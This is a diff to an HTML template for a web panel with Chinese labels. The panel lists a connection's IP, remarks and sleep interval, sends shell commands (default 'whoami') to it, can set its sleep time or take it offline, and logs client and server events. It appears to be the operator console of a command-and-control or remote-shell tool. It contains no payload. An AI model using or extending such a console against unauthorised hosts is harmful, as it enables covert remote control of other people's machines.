@@ -23,20 +23,14 @@
             text-align: center;
         }
     </style>
+    <script type="text/javascript">
+        var textarea = document.getElementById('cmd_textarea');
+        textarea.scrollTop = textarea.scrollHeight;
+    </script>
 </head>
 <body>
     <div class="page-header">
-        <h2 class="text-center">Manager : {{ conn.ip }} / {{conn.info.remarks}}</h2>
-    </div>
-    <div style="text-align: center;" id="cmdcommand" class="tab-pane fade in active">
-            <label>
-                <textarea id="cmd_textarea" rows="15" style="width: 95%" disabled="disabled">
-                    {% for i in events %}
-                        {{ i }}
-                    {% endfor %}
-                </textarea>
-            </label>
-            
+        <h2 class="text-center">Manager : {{ conn.ip }} / {{conn.info.remarks}} /  {{conn.sleep}}s </h2>
     </div>
 
 <center>
@@ -45,9 +39,7 @@
         <br>
         <form action="?action=shell" method="POST">
             <label>
-                应用地址：<input name="target" type="text" >
-                <br>
-                携带参数：<input name="param" type="text">
+                命令：<input name="command" type="text" value="whoami">
                 <br>
                 <input type="submit" value="提交">
             </label>
@@ -64,6 +56,16 @@
             <br>
             <input type="submit" value="提交">
         </form>
+
+        <form action="?action=sleep" method="POST">
+            Sleep：<input name="sleep" type="text">
+            <br>
+            <input type="submit" value="提交">
+        </form>
+
+        <a href="?action=clear">清空缓存</a><br>
+        <a href="?action=delete">下线</a>
+        <a href="../">返回</a>
     </div>
 
 
@@ -86,5 +88,25 @@
         </form>
     </div>
 </center>
+<div id="div_log" width="80%"
+     style="margin-left:10%;margin-right:11%;text-align:left;margin-top: 50px;max-height: 20%">
+    <h2>日志</h2>
+    <div id="log" style="border-style:solid; border-width:1px; border-color:#000;">
+        {% for i in events %}
+            {% if i.is_client  %}
+                <div style="text-align: left;border: 1px dotted black;">
+                    <h4  style='color:green'>From {{ i.action }} Date: {{ i.time }}</h4>
+                    <p style='color:green'> {{ i.data }}</p>
+                </div>
+                {% else %}
+                <div style="text-align: right;border: 1px dotted black;">
+                    <h4  style='color:red'>From {{ i.action }} Date: {{ i.time }}</h4>
+                    <p style='color:red'> {{ i.data }}</p>
+                </div>
+            {% endif %}
+            
+        {% endfor %}
+    </div>
+</div>
 
 </body>
